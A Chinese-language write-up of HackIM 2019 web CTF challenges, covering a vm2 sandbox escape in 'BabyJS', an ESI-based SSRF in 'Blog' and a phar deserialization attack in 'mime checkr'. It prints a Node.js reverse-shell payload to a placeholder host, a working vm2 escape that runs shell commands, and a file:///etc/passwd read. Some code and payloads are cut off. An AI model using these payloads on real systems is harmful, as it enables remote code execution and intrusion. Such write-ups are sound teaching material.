# HackIM 2019 Web记录
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
过年前做了一下，感觉还是挺有意思的。比赛官方也开源了[比赛源码](https://github.com/nullcon/hackim-2019)。
## Web
###  BabyJS
> ​ Run your javascript code inside this page and preview it because of
> hackers we have only limited functions
题目内容如上，比较简单的 javascript 代码运行，后台是 Node.js
这里我们可以考虑一下是不是有什么 Node.js 沙箱逃逸什么的操作，国内对于 Node.js
沙箱逃逸的文章还是比较少的，参考了好几篇都是翻译文章，都翻译得不是很清楚，参考文章：[NodeJS沙盒逃逸研究](http://www.4hou.com/web/14837.html)
但是也能知道个大概，要执行命令或者反弹 shell 就需要用到两个模块，分别是 net 和 child_process ，可以用以下 payload
直接反弹 shell
    (function () {
        var net = require("net"),
            cp = require("child_process"),
            sh = cp.spawn("/bin/sh", []);
        var client = new net.Socket();
        client.connect(your_port, "your_ip", function () {
            client.pipe(sh.stdin);
            sh.stdout.pipe(client);
            sh.stderr.pipe(client);
        });
        return /a/; // Prevents the Node.js application form crashing
    })();
然而当我们想直接反弹 shell （那当然是太天真了），就返回了`not defined`
所以没那么简单，那我们先从信息收集开始，使用`Error().stack`可以收集使用的模块信息，而且题目设置是可以直接把内容输出出来的，所以我们不需要`print`，可以直接输出信息。
我们首先先收集目标信息，使用`js=Error().stack`
我们可以得到题目设置的模块，如`vm.js`，然后发现对应的[vm2](https://github.com/patriksimek/vm2)仓库里已经有很多
escape 的 issue 了，发现有一位 [@XmiliaH](https://github.com/XmiliaH "@XmiliaH") 大佬已经
escape 了很多版本，我们可以尝试一下比较新的一个版本[Breakout in
v3.6.9](https://github.com/patriksimek/vm2/issues/186)
    var process;
    try{
    Object.defineProperty(Buffer.from(""),"",{
        value:new Proxy({},{
            getPrototypeOf(target){
                if(this.t)
                    throw Buffer.from;
                this.t=true;
                return Object.getPrototypeOf(target);
            }
        })
    });
    }catch(e){
        process = e.constructor("return process")();
    }
    process.mainModule.require("child_process").execSync("ls").toString()
直接作为 payload 使用，发现可以成功执行命令
接下来直接读 flag 就好了，得到
    hackim19{S@ndbox_0_h4cker_1}
###  Blog
> ​ Its just a blog
题目是一个 Node.js ，题目设置比较简单，就一个表单，提交之后参数会得到相应的页面
以及还有一个 admin 界面
index 界面输入什么就以 HTML 形式返回什么，也可以触发 XSS
但是这只是一个 self-xss ，这就显得又些鸡肋了，所以大概意思就是我们需要用 index 做 xss 或者其他一些操作去获取管理员权限
跟上题一样，既然都是 Node.js ，是不是也可以得到一些错误信息什么的。
在尝试了一些单引号、双引号等一些特殊符号，发现确实是全部都转换成 string
输出了，猜想是不是有类似`toString()`的操作，换成数组测试，发现无回显，一直停留在 pending 状态中
尝试直接访问 /edge 页面，得到错误信息
但是这都是用于前端效果的 js 库，并没有什么用，但是思路应该是没错的，继续 fuzz 就行了。
最终用`title=1&description[a]=1`得到了比较有用的报错信息，得到了一个新的库 esi.js ，查看相关资料[Node ESI
Language parser](https://www.npmjs.com/package/esi)，可以知道这是一个用于处理 ESI 语言的 js
库，使用示例官方也给出来了
> ​ You want to embed the fragment of HTML from
> ““ within an HTML document.
>  
>  
>     blah blah, oh and here i embed in the page a snipet using an ESI server
> ...
>     
>  
>
> **snipet.html**
>  
>  
>     Snipet
>  
>
> With Node ESI script, you can pre-process ESI tags.
看到这里我们的思路就比较清晰，就是以 esi 的方式去访问 admin 页面就可以了，相当于形成了一个 SSRF 。
    payload:
    title=1&description=
###  mime checkr
> ​ upload and check the mime type
>
> Hint1: Do you think containers could speak like humans?
题目设置为有一个上传点，只允许上传 .jpeg 后缀的文件，尝试了一下其他截断，均不能上传其他文件
还有一个获取 MIME 格式的功能，需要传入路径，返回 MIME 格式
还有一个备份文件`getmime.bak`
    why =new CurlClass;
            echo $this->url;
            echo $this->why->httpGet($this->url);
        }
    }
    // Check if image file is a actual image or fake image
    if(isset($_POST["submit"])) {
        $check = getimagesize($_POST['name']);
        if($check !== false) {
            echo "File is an image - " . $check["mime"] . ".";
            $uploadOk = 1;
        } else {
            echo "File is not an image.";
            $uploadOk = 0;
        }
    }
    ?>
看到备份文件中有`_destruct`与`curl`，思路也就比较清晰了，大致需要我们上传一个 phar
文件，然后用`phar://xx/xx`去触发反序列化漏洞。
这里我先测试`file:///etc/passwd`，用以下代码生成 phar 文件
    why = new CurlClass;
            echo $this->url;